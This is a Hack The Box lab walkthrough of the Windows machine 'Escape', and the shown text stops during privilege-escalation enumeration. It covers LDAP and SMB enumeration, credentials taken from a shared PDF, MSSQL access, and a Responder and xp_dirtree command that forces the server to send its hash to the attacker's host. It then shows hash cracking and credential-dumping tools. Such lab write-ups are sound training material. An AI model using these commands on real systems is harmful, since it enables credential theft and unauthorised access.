+++
tags = ["Box", "HTB", "Medium", "Windows", "LDAP", "MSSQL", "MYSQL", "CA", "CERTIFICATE"]
draft = false
title = "Escape HTB Walkthrough"
author = "bloodstiller"
date = 2024-10-05
+++

## Escape Hack The Box Walkthrough/Writeup: {#escape-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/%3CBoxName%3E>

## How I use variables &amp; wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
        -   Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.
-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)

## 1. Enumeration: {#1-dot-enumeration}


### NMAP: {#nmap}

-   **Basic Scan**:
    -   `nmap $box -Pn -oA basicScan`
        ```shell
          kali in 46.02-HTB/BlogEntriesMade/Escape/scans/nmap  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
           08:21:02 zsh ❯ nmap $box -Pn -oA basicScan
          Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-04 08:21 BST
          Nmap scan report for 10.129.228.253
          Host is up (0.042s latency).
          Not shown: 988 filtered tcp ports (no-response)
          PORT     STATE SERVICE
          53/tcp   open  domain
          88/tcp   open  kerberos-sec
          135/tcp  open  msrpc
          139/tcp  open  netbios-ssn
          389/tcp  open  ldap
          445/tcp  open  microsoft-ds
          464/tcp  open  kpasswd5
          593/tcp  open  http-rpc-epmap
          636/tcp  open  ldapssl
          1433/tcp open  ms-sql-s
          3268/tcp open  globalcatLDAP
          3269/tcp open  globalcatLDAPssl

          Nmap done: 1 IP address (1 host up) scanned in 12.52 seconds

        ```
    -   **Some interesting enumeration paths already**:
        -   `53` - DNS:
            -   We can check for interesting records:
        -   `88` - Kerberos:
            -   We can use kerbrute to bruteforce users using pre-auth.
        -   `445` - Good ol' smb:
            -   We can check for null sessions.
        -   `389` - LDAP:
            -   We can check for anonymous binds and enumerate the domain.
        -   `1443` - MSSQL:
            -   A good target in general to go after.

-   **In depth scan**:

    -   `sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP`

    <!--listend-->

    ```shell
    kali in 46.02-HTB/BlogEntriesMade/Escape/scans/nmap  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh  took 12s
     08:21:23 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
    [sudo] password for kali:
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-04 08:21 BST
    Nmap scan report for 10.129.228.253
    Host is up (0.038s latency).
    Not shown: 65515 filtered tcp ports (no-response)
    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Simple DNS Plus
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-04 15:24:15Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
    | ssl-cert: Subject:
    | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
    | Not valid before: 2024-01-18T23:03:57
    |_Not valid after:  2074-01-05T23:03:57
    |_ssl-date: 2024-10-04T15:25:48+00:00; +8h00m00s from scanner time.
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
    | ssl-cert: Subject:
    | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
    | Not valid before: 2024-01-18T23:03:57
    |_Not valid after:  2074-01-05T23:03:57
    |_ssl-date: 2024-10-04T15:25:48+00:00; +8h00m00s from scanner time.
    1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
    | ms-sql-ntlm-info:
    |   10.129.228.253:1433:
    |     Target_Name: sequel
    |     NetBIOS_Domain_Name: sequel
    |     NetBIOS_Computer_Name: DC
    |     DNS_Domain_Name: sequel.htb
    |     DNS_Computer_Name: dc.sequel.htb
    |     DNS_Tree_Name: sequel.htb
    |_    Product_Version: 10.0.17763
    | ms-sql-info:
    |   10.129.228.253:1433:
    |     Version:
    |       name: Microsoft SQL Server 2019 RTM
    |       number: 15.00.2000.00
    |       Product: Microsoft SQL Server 2019
    |       Service pack level: RTM
    |       Post-SP patches applied: false
    |_    TCP port: 1433
    |_ssl-date: 2024-10-04T15:25:48+00:00; +8h00m00s from scanner time.
    | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
    | Not valid before: 2024-10-04T15:17:39
    |_Not valid after:  2054-10-04T15:17:39
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
    | ssl-cert: Subject:
    | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
    | Not valid before: 2024-01-18T23:03:57
    |_Not valid after:  2074-01-05T23:03:57
    |_ssl-date: 2024-10-04T15:25:48+00:00; +8h00m00s from scanner time.
    3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
    | ssl-cert: Subject:
    | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
    | Not valid before: 2024-01-18T23:03:57
    |_Not valid after:  2074-01-05T23:03:57
    |_ssl-date: 2024-10-04T15:25:48+00:00; +8h00m00s from scanner time.
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    9389/tcp  open  mc-nmf        .NET Message Framing
    49669/tcp open  msrpc         Microsoft Windows RPC
    49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49694/tcp open  msrpc         Microsoft Windows RPC
    49712/tcp open  msrpc         Microsoft Windows RPC
    49722/tcp open  msrpc         Microsoft Windows RPC
    49743/tcp open  msrpc         Microsoft Windows RPC
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running (JUST GUESSING): Microsoft Windows 2019 (89%)
    Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
    No exact OS matches for host (test conditions non-ideal).
    Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
    | smb2-security-mode:
    |   3:1:1:
    |_    Message signing enabled and required
    | smb2-time:
    |   date: 2024-10-04T15:25:11
    |_  start_date: N/A

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 242.11 seconds

    ```


### LDAP `389`: {#ldap-389}

-   **Using LDAP anonymous bind to enumerate further**:
    -   If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
        -   We can actually retrieve a significant amount of information via anonymous bind such as:
            -   A list of all users
            -   A list of all groups
            -   A list of all computers.
            -   User account attributes.
            -   The domain password policy.
            -   Enumerate users who are susceptible to AS-REPRoasting.
            -   Passwords stored in the description fields
        -   The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.
-   I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here
    -   <https://github.com/bloodstiller/ldapchecker>

-   It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.
    1.  <span class="underline">We have the naming context of the domain</span>:
        ```shell
        kali in ~/Desktop/WindowsTools  v3.12.6  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
         08:22:05 zsh ❯ python3 ldapchecker.py $box
        Attempting to connect to 10.129.228.253 with SSL...
        Connected successfully. Retrieving server information...
        DSA info (from DSE):
          Supported LDAP versions: 3, 2
          Naming contexts:
            DC=sequel,DC=htb
            CN=Configuration,DC=sequel,DC=htb
            CN=Schema,CN=Configuration,DC=sequel,DC=htb
            DC=DomainDnsZones,DC=sequel,DC=htb
            DC=ForestDnsZones,DC=sequel,DC=htb
        ```

    2.  <span class="underline">We have the domain functionaility level</span>:
        ```shell
        Other:
          domainFunctionality:
            7
          forestFunctionality:
            7
          domainControllerFunctionality:
            7
          rootDomainNamingContext:
            DC=sequel,DC=htb
          ldapServiceName:
            sequel.htb:dc$@SEQUEL.HTB
        ```

        -   The functionality level determines the minimum version of Windows server that can be used for a DC.
            -   +Note+: That any host os can used on **workstations**, however the functionality level determines what the minimum version for DC's and the forest.
            -   <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels>
            -   Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.

            -   In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.
            -   Here’s a list of functional level numbers and their corresponding Windows Server operating systems:

                | Functional Level Number | Corresponding OS            |
                |-------------------------|-----------------------------|
                | 0                       | Windows 2000                |
                | 1                       | Windows Server 2003 Interim |
                | 2                       | Windows Server 2003         |
                | 3                       | Windows Server 2008         |
                | 4                       | Windows Server 2008 R2      |
                | 5                       | Windows Server 2012         |
                | 6                       | Windows Server 2012 R2      |
                | 7                       | Windows Server 2016         |
                | 8                       | Windows Server 2019         |
                | 9                       | Windows Server 2022         |

                -   +Note+:
                    -   Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
                    -   As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.

    3.  <span class="underline">We have the full server name</span>:
        -   Again we can see this has the CN as the base (mentioned previously.) 
            ```shell
             serverName:
                CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=sequel,DC=htb
            ```
-   It's pretty amazing already what we have learned just by running some fairly simple ldap queries.
    -   We have the naming context.
    -   Domain name.

-   **I update my `/etc/hosts` file now that we have the server name**.
    -   This is so we can use tools like [kerbrute](https://github.com/ropnop/kerbrute) for user enumeration as well as other tools later on.


### DNS `53`: {#dns-53}


#### Using [dnsenum](https://www.kali.org/tools/dnsenum/) to enumerate DNS records: {#using-dnsenum-to-enumerate-dns-records}

-   Run [dnsenum](https://www.kali.org/tools/dnsenum/) to enumerate if there are any interesting records present:
    -   `dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt sequel.htb`
        -   {{< figure src="/ox-hugo/2024-10-04-084509_.png" >}}
            -   Nothing of note other than the standard DNS records for a DC.


### Kerberos `88`: {#kerberos-88}


#### Using [Kerbrute](https://github.com/ropnop/kerbrute) to bruteforce Usernames: {#using-kerbrute-to-bruteforce-usernames}

-   As kerberos is present we can enumerate users using [kerbrute](https://github.com/ropnop/kerbrute):
    -   `kerbrute userenum -d sequel.htb --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt`
    -   {{< figure src="/ox-hugo/2024-10-04-084056_.png" >}}
    -   Unfortunately we get no hits:


### SMB `445`: {#smb-445}


#### Using [netexec](https://www.kali.org/tools/netexec/) to check for null &amp; guest session on SMB: {#using-netexec-to-check-for-null-and-guest-session-on-smb}

-   **I check for a null sesion using netexec but they have been disabled**:
    -   `netexec smb $box -u '' -p '' --shares`
    -   {{< figure src="/ox-hugo/2024-10-04-084303_.png" >}}

-   **I check if the guest account has been disabled**:
    -   `netexec smb $box -u 'guest' -p '' --shares`
    -   {{< figure src="/ox-hugo/2024-10-04-084640_.png" >}}
    -   It looks like we can access the `Public` &amp; `IPC$` We will focus on the `Public` share.


##### Over view of `IPC$` Share: {#over-view-of-ipc-share}

-   **Quick overview if you are unfamiliar with the `IPC$` share**:
    -   The `IPC$` share (`Inter-Process Communication`) is a special administrative share in Windows which allows communication with programs via Named Pipes:
        -   It's mainly used for inter-process communication between hosts over a network.
        -   It also enables remote administration of a system, allowing file and print sharing.
        -   It's a default share on windows systems.
        -   Requires credentials for access, typically used in conjunction with administrative or user rights.
            -   But as you can see `Guest` creds can also work in some instances.
        -   It is possible to use `IPC$` for enumeration (e.g., enumerating users, shares, groups or services).


#### Connecting to the Public `SMB` Share using `smbclient`: {#connecting-to-the-public-smb-share-using-smbclient}

-   **I logon to the share using a guest session**:
    -   `smbclient -U 'guest'  "\\\\$box\\Public"`
        -   I see they have a `.pdf` called `SQL Server Procedures` in the share
            -   {{< figure src="/ox-hugo/2024-10-04-090146_.png" >}}

-   **I download the** `.pdf`:
    -   `Get "SQL Server Procedures.pdf"`
    -   {{< figure src="/ox-hugo/2024-10-04-090343_.png" >}}


#### Attempting to extract creator names from the `.PDF`: {#attempting-to-extract-creator-names-from-the-dot-pdf}

If you are not aware, it is sometimes possible to extract valid domain usernames from `pdf's` if they have been created on a Windows host. As often the Creator Field is populated using the Windows User's Logged-In Name

-   **Some reasons why the Creator Field Uses the Windows User's Logged-In Name**:
    -   **PDF Metadata Collection**:
        -   When creating a PDF, many programs (e.g., Microsoft Word, Adobe Acrobat) automatically pull metadata from the system.

    -   **System Environment Variables**:
        -   The logged-in Windows username is part of system environment variables. This is often used to populate fields like "`Creator`" in the PDF document.

    -   **Program Defaults**:
        -   By default, many PDF generation tools use the logged-in username as the creator unless manually changed by the user.

    -   **Tracking Ownership**:
        -   This feature helps track the original creator or author of a document for auditing or document management purposes.


##### Attempting to extract Usernames From the PDF using exiftool: {#attempting-to-extract-usernames-from-the-pdf-using-exiftool}

-   `exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq > userNames.txt`
-   I run it and check the output of the file, however there are no valid usernames, just that it was crated using Mozilla.
-   {{< figure src="/ox-hugo/2024-10-04-091217_.png" >}}

<!--list-separator-->

-  Command Breakdown:

    1.  `exiftool -Creator -csv *pdf`
        -   `exiftool`: Run the tool
        -   `-Creator`: Extracts the `Creator` metadata field from the files.
        -   `-csv`: Outputs the data in CSV format.
            -   This is the most important part for the rest of the command to work:
                -   The `CSV` format provides a structured way to output the metadata in rows and columns. When extracting metadata from multiple PDFs, each PDF's metadata is presented as a row, and each field (like "`Creator`") is a column. This makes it easier to process the data programmatically.
                -   **Simplicity**: When using tools like `cut`, it’s easier to extract specific fields by referring to column numbers (e.g., `-f2` for the second column), which is straightforward with `CSV` formatting.
        -   `*pdf`: Targets all PDF files in the current directory.
    2.  `| cut -d, -f2`
        -   `|`: Pipes the output from the previous command into the next.
        -   `cut`: Extracts specific fields from the CSV output.
        -   `-d,`: Uses a comma as the delimiter (since it's CSV data).
        -   `-f2`: Selects the second field, which contains the creator name.
    3.  `| sort`: Sorts the creator names alphabetically.
    4.  `| uniq`: Removes duplicate names, leaving only unique entries.

    5.  `> userNames.txt`
        -   Redirects the final output (unique creator names) into a file named `userNames.txt`


#### Finding Hard-Coded mSSQL Creds in the `SQL Server Procedures` PDF: {#finding-hard-coded-mssql-creds-in-the-sql-server-procedures-pdf}

-   **Problematic MSSQL Instance**:
    -   Reading the PDF it details how the company has had issues with mistakes with the MSSQL instance. However it appears there is still a live server running on the DC (which we have seen from our `NMAP` scan)
        -   {{< figure src="/ox-hugo/2024-10-04-091649_.png" >}}

-   **Hard Coded Creds**:
    -   Looking on the second page we can see they hard creds for new hires and have placed these in the `.pdf` naughty, naughty!
    -   {{< figure src="/ox-hugo/2024-10-04-091505_.png" >}}
    -   We will use these to connect


#### Finding Usernames within the PDF: {#finding-usernames-within-the-pdf}

-   **Finding Usernames**:
    -   Looking through the file we can see that the users, `Ryan`, `Tom` &amp; `Brandon`.
        There is also a mail to hyperlink to Brandon that reveals his username to be `Brandon.brown@sequel.htb` I will add these to my username list.


#### Cred Stuffing &amp; Meaning of "`Guest`" in the `SMB` Responses in `netexec`: {#cred-stuffing-and-meaning-of-guest-in-the-smb-responses-in-netexec}

-   I tried cred stuffing all of the users &amp; the password I have found so far and got the below output, where `(Guest)` was appended to each attempt.
    -   {{< figure src="/ox-hugo/2024-10-04-092745_.png" >}}
    -   I had never seen this before &amp; it led me to this page:
        -   <https://www.netexec.wiki/smb-protocol/enumeration/enumerate-guest-logon>
        -   Which says this:

            > Using a random username and password you can check if the target accepts guest logon. If so, it means that either the domain guest account or the local guest account of the server you're targetting is enabled.
-   **Guest account in** `SMB`:
    -   `SMB` servers often allow users to connect as a `Guest`, meaning the users have limited or no write permissions. The server may allow these users to read files but restrict their ability to modify or create new files.
    -   In this case `sequel.htb\ryan:GuestUserCantWrite1 (Guest)` indicates that the `ryan` account is authenticated, but with Guest permissions, likely meaning the account does not have full access to resources.
    -   So when you see "`Guest`" listed after users like `sequel.htb\ryan`, `sequel.htb\tom`, etc., it indicates that the user account is being authenticated using the Guest account privileges in SMB.


### MSSQL `1433`: {#mssql-1433}

-   I store each useful bit of information in `VARS` so I can easily call on them later and have to type way less:
    -   {{< figure src="/ox-hugo/2024-10-04-093531_.png" >}}
    -   This is also a great way to ensure you make less mistakes &amp; type-os.


#### Cred stuffing the MSSQL Instance: {#cred-stuffing-the-mssql-instance}

-   I cred stuff with all the known users so far just incase they have not changed their password from the default password, however it appears they have.
-   {{< figure src="/ox-hugo/2024-10-04-111518_.png" >}}


## 2. Foothold: {#2-dot-foothold}


### Connecting to the MSSQL Instance using impacket-mssqlclient: {#connecting-to-the-mssql-instance-using-impacket-mssqlclient}

-   **Connecting to the mssql instance**:
    -   `impacket-mssqlclient $domain/$user:$pass@$box`
    -   {{< figure src="/ox-hugo/2024-10-04-093702_.png" >}}


### Enumerating the MSSQL Instance: {#enumerating-the-mssql-instance}

-   Looking through the mssql instance there are only default databases.
-   I try and activate `xp_cmdshell` however we do not have perms:
    -   {{< figure src="/ox-hugo/2024-10-04-113407_.png" >}}


### Capturing the MSSQL System Admin hash using [Responder](https://www.kali.org/tools/responder/) &amp; `xp_dirtree`: {#capturing-the-mssql-system-admin-hash-using-responder-and-xp-dirtree}

-   I know that it's possible to read files using `xp_dirtree` as I did this on the Manager box:
    -   <https://bloodstiller.com/walkthroughs/manager-box/>

-   **I check if I can use `xp_dirtree` to read &amp; list local files**
    -   {{< figure src="/ox-hugo/2024-10-04-114913_.png" >}}
    -   I cannot read files however my password is `GuestUserCantWrite1` so lets see if we can write as I know it's possible to host a malicious SMB server and request the DB instance attempt to connect so we can capture the `MSSQL System Administrator Hash`
        -   Just a note: impacket-mssqlclient.py has good tools built in already so you you can just run `xp_dirtee <path>` you do not have to use all args etc.
            -   {{< figure src="/ox-hugo/2024-10-04-125702_.png" >}}

<!--listend-->

1.  **I start** [Responder](https://www.kali.org/tools/responder/):
    -   `sudo responder -v -I tun0`

2.  **I use** `xp_dirtee` **to connect back to my malicious SMB server**:
    -   `exec master..xp_dirtree '\\10.10.14.38\share\'`
        -   This is just \\\\&lt;MYKALIIP\FAKESHARE&gt;
        -   {{< figure src="/ox-hugo/2024-10-04-115426_.png" >}}

3.  **Hash Caught**:
    -   {{< figure src="/ox-hugo/2024-10-04-115545_.png" >}}
    -   This works as when we run the command using `xp_dirtree` it tries to connect &amp; authorize to our malicious `SMB server` &amp; [Responder](https://www.kali.org/tools/responder/) captures the hash:


#### Overview of `xp_dirtree`: {#overview-of-xp-dirtree}

-   `xp_dirtree` is an extended stored procedure in Microsoft SQL Server.
-   It is used to list the directory structure (files and subdirectories) of a specified path on the server.
-   Command Injection Risk: Since it's interacting with the OS, it can be a target for malicious input if not properly handled. (E.G. Getting it to connect to our malicious SMB server so we can capture hashes)

-   **Using** `xp_dirtree`:
-   Called using the syntax below:
    -   `EXEC xp_dirtree 'path', depth, file_flag;`
    -   **Example**: `EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1;`
    -   **Example**: `EXEC xp_dirtree 'C:\', 1, 1;`
        -   **Notes**:
            -   **Path Specified**:
                -   `C:\` Lists the contents of the root of the C drive.
            -   **Depth Level**:
                -   `1`: Indicates it will list files and directories in the first level of the C drive.
                -   This includes files directly in `C:\` and the first-level directories under `C:\`.
            -   **File Flag**:
                -   `1`: Specifies that both files and directories should be included in the output.
            -   **Output**:
                -   <span class="underline">The result set will contain</span>:
                    -   All files located directly in `C:\`.
                    -   All first-level subdirectories (e.g., `C:\Program Files`, `C:\Windows`, etc.).
            -   +Note+:
                -   The command does **not** recursively list files in subdirectories beyond the first level due to the specified depth of 1~.
                -   If you want to see files in deeper levels, you can increase the depth parameter e.g. `2`, `3` etc


### Cracking the MSSQL System Admin using [Hashcat](https://www.kali.org/tools/hashcat/): {#cracking-the-mssql-system-admin-using-hashcat}

-   **I fire up** [hashcat](https://www.kali.org/tools/hashcat/) **and good ol' trusty rockyou**
    -   `hashcat -m 5600 mssqlhash ~/Wordlists/rockyou.txt`
    -   {{< figure src="/ox-hugo/2024-10-04-115952_.png" >}}
        -   Cracked!! In theory we should be able to authorize as this DBA, activate `xp_cmdshell` and get code execution on the underlying OS.

-   **I verify it's valid**:
    -   {{< figure src="/ox-hugo/2024-10-04-120456_.png" >}}


### Enumerating SMB as `sql_svc` user: {#enumerating-smb-as-sql-svc-user}

-   I check with netexec if the user can connect to SMB and they can, they have access to the `SYSVOL` share as well as the `NETLOGON` share.
    -   {{< figure src="/ox-hugo/2024-10-04-121444_.png" >}}

-   `SYSVOL` **Share Enumeration**:
    -   I use smbmap to enumerate the share but there is nothing of note:
        -   `smbmap -u $user -p $pass -H $box -r SYSVOl`
        -   {{< figure src="/ox-hugo/2024-10-04-122445_.png" >}}

-   `NETLOGON` **Share Enumeration**:
    -   `smbmap -u $user -p $pass -H $box -r NETLOGON`
    -   {{< figure src="/ox-hugo/2024-10-04-122604_.png" >}}


#### `SYSVOL` Share: {#sysvol-share}

-   Part of the `SYSVOL` directory is shared as the `SYSVOL` share; this is critical for distributing files necessary for Group Policy &amp; will often be used to hold scripts on a DC so this is a good target to go after.


### Running bloodhound.py: {#running-bloodhound-dot-py}

-   **I use** `bloodhound.py` **to enumerate the domain with the creds I have**.
    -   `python3 bloodhound.py -dc dc.sequel.htb -c All -u $user -p $pass -d sequel.htb -ns $box`
    -   {{< figure src="/ox-hugo/2024-10-04-122851_.png" >}}
    -   Looking at the results our current user does not have that many privielges so I will continue to enumerate.


### Connecting to the MSSQL as `sql_svc`: {#connecting-to-the-mssql-as-sql-svc}

-   **I connect to the host as** `sql_svx`:
    -   {{< figure src="/ox-hugo/2024-10-04-120929_.png" >}}

-   **I try and enable** `xp_cmdshell` **but am unable to**:
    -   {{< figure src="/ox-hugo/2024-10-04-121124_.png" >}}


### Finding a linked SQL Instance: {#finding-a-linked-sql-instance}

-   +Correction+: This is wrong, I later found it was just showing me my existing database, I have left it in as I believe it's important and show these mistakes.

-   **I check if there are any linked remote SQL instances running**:
    -   `SELECT srvname, isremote FROM sysservers;`
    -   {{< figure src="/ox-hugo/2024-10-04-172538_.png" >}}
    -   We can also run the inbuilt command in `impacket-mssql`:
    -   `enum_links`
    -   {{< figure src="/ox-hugo/2024-10-04-172800_.png" >}}
        -   I try and connect but I am unable to access the instance


### Enumerating the Host Using `xp_dirtree`: {#enumerating-the-host-using-xp-dirtree}

-   **I check if am able to use** `xp_dirtree` **to list files on the host**:
    -   {{< figure src="/ox-hugo/2024-10-04-125627_.png" >}}
    -   Bingo

-   **I list the users home folders and find a** `Ryan.Cooper`:
    -   {{< figure src="/ox-hugo/2024-10-04-125933_.png" >}}
    -   I add his name to my users.

-   **I try and list his home folder but don't have perms**:
    -   {{< figure src="/ox-hugo/2024-10-04-130119_.png" >}}

-   **I enumerate further and find that there is an** `ERRORLOG.BAK` \*file stored in `C:\SQLServer\Logs\`
    -   {{< figure src="/ox-hugo/2024-10-04-201906_.png" >}}


### Downloading `ERRORLOG.BAK` &amp; why it's important to re-check your tools: {#downloading-errorlog-dot-bak-and-why-it-s-important-to-re-check-your-tools}

-   **I try and use the** `SINGLE_CLOB` **approach to read the file but don't have the required permissions**:
    -   `SELECT * FROM OPENROWSET(BULK N'C:\SQLServer\Logs\ERRORLOG.BAK', SINGLE_CLOB) AS Contents`
    -   {{< figure src="/ox-hugo/2024-10-04-202033_.png" >}}

-   **I try and create a new MSSQL database so I can then import the `ERROLOG.BAK` into it**:
    -   `CREATE DATABASE hacker;`
    -   {{< figure src="/ox-hugo/2024-10-04-202602_.png" >}}
    -   Denied again.

-   **Using evil-winrm to retrieve the** `ERRORLOG.BAK` **file**:
    -   I try and connect with `evil-winrm` which I was convinced I did earlier &amp; couldn't but tried again anyway &amp; could connect!!!
        -   Slap me with the idiot gun stick!!!
        -   {{< figure src="/ox-hugo/2024-10-04-203935_.png" >}}
        -   +Note+: This is something I want to stress, it's really important to re-check tools in situations like this sometimes you get false positives &amp; false negatives.


### Reading `ERRORLOG.BAK` &amp; finding credentials for `Ryan.Cooper`: {#reading-errorlog-dot-bak-and-finding-credentials-for-ryan-dot-cooper}

-   **I open the `ERRORLOG.BAK` in my text editor**:
    -   I search for the string "password" &amp; get a hit containing `Ryan.Coopers` password:
    -   {{< figure src="/ox-hugo/2024-10-04-204115_.png" >}}

-   **I verify if the creds are still valid using** `netexec`:
    -   `netexec smb $box -u $user -p $pass --shares`
    -   {{< figure src="/ox-hugo/2024-10-04-204628_.png" >}}


## 3. Privilege Escalation: {#3-dot-privilege-escalation}


### Enumerating the host as `Ryan.Cooper`: {#enumerating-the-host-as-ryan-dot-cooper}

-   In this section I am going to show EVERYTHING I do, obviously blogs are cultivated and don't show every little thing, but I want to show all the tools I try to get root.

-   **I connect via** `evil-winrm` **&amp; retrive the flag**:
    -   {{< figure src="/ox-hugo/2024-10-04-204858_.png" >}}


#### Automated Enumeration: {#automated-enumeration}

-   **I check bloodhound**:
    -   But there is no clear path here so we need to enumerate the host and the user further:

-   **I try and run** `secretsdump.py`:
    -   {{< figure src="/ox-hugo/2024-10-04-205950_.png" >}}
    -   +Note+: This may seem weird to do now, however I have had success retriveing creds this way and moving laterally.

-   **Running** `LaZagne.exe`:
    -   We get nothing, will have to try harder&#x2026;offsec is that you?
        -   {{< figure src="/ox-hugo/2024-10-04-210426_.png" >}}

-   **I run** `SessionGopher.ps1` **to check for any other sessions**:
    -   {{< figure src="/ox-hugo/2024-10-04-210750_.png" >}}

-   **I run** `privesccheck.ps1`:
    -   I do see that LSA is not protected:
        -   {{< figure src="/ox-hugo/2024-10-04-211219_.png" >}}


#### Stored Credentials Enumeration: {#stored-credentials-enumeration}

-   **Check for stored creds using** `cmdkey`:
    -   `cmdkey /list`
    -   {{< figure src="/ox-hugo/2024-10-04-211842_.png" >}}


#### User Enumeration: {#user-enumeration}

-   **I enumerate users**:
    -   `net user`
    -   {{< figure src="/ox-hugo/2024-10-04-214453_.png" >}}
    -   +Note+: The reason my user enumeration is not more extensive is due to the fact that Groups, Users &amp; Hosts are enumerated via bloodhound. My main goal at the moment is to find out what is happening on this specific DC.


#### Basic System Enumeration: {#basic-system-enumeration}

-   **I try and gather basic** `systeminfo` **but am denied**:
    -   {{< figure src="/ox-hugo/2024-10-04-211944_.png" >}}


#### Installed Program Enumeration: {#installed-program-enumeration}

-   **I list all the installed programs by querying the registry keys using powershell**:
    ```powershell
    *Evil-WinRM* PS C:> ('HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*', 'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*') | ForEach-Object { Get-ItemProperty -Path $_ } | Select-Object DisplayName, DisplayVersion, InstallLocation | Format-Table -AutoSize

    DisplayName                                                        DisplayVersion  InstallLocation
    -----------                                                        --------------  ---------------

    Microsoft SQL Server 2019 (64-bit)
    Microsoft SQL Server 2019 (64-bit)

    SQL Server 2019 Common Files                                       15.0.2000.5
    Microsoft SQL Server 2019 Setup (English)                          15.0.4013.40
    SQL Server 2019 XEvent                                             15.0.2000.5
    SQL Server 2019 XEvent                                             15.0.2000.5
    SQL Server 2019 SQL Diagnostics                                    15.0.2000.5
    Microsoft VSS Writer for SQL Server 2019                           15.0.2000.5
    Microsoft SQL Server 2019 T-SQL Language Service                   15.0.2000.5
    Microsoft SQL Server 2019 RsFx Driver                              15.0.2000.5
    SQL Server 2019 Common Files                                       15.0.2000.5
    SQL Server 2019 Database Engine Shared                             15.0.2000.5
    SQL Server 2019 Shared Management Objects                          15.0.2000.5
    Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.29.30133        14.29.30133
    SQL Server 2019 DMF                                                15.0.2000.5
    Microsoft ODBC Driver 17 for SQL Server                            17.7.2.1
    SQL Server 2019 Shared Management Objects Extensions               15.0.2000.5
    SQL Server 2019 Connection Info                                    15.0.2000.5
    Microsoft OLE DB Driver for SQL Server                             18.5.0.0
    Microsoft SQL Server 2012 Native Client                            11.4.7462.6
    SQL Server 2019 Database Engine Services                           15.0.2000.5
    SQL Server 2019 Shared Management Objects                          15.0.2000.5
    SQL Server 2019 Shared Management Objects Extensions               15.0.2000.5
    VMware Tools                                                       12.0.6.20104755 C:\Program Files\VMware\VMware Tools\
    SQL Server 2019 Batch Parser                                       15.0.2000.5
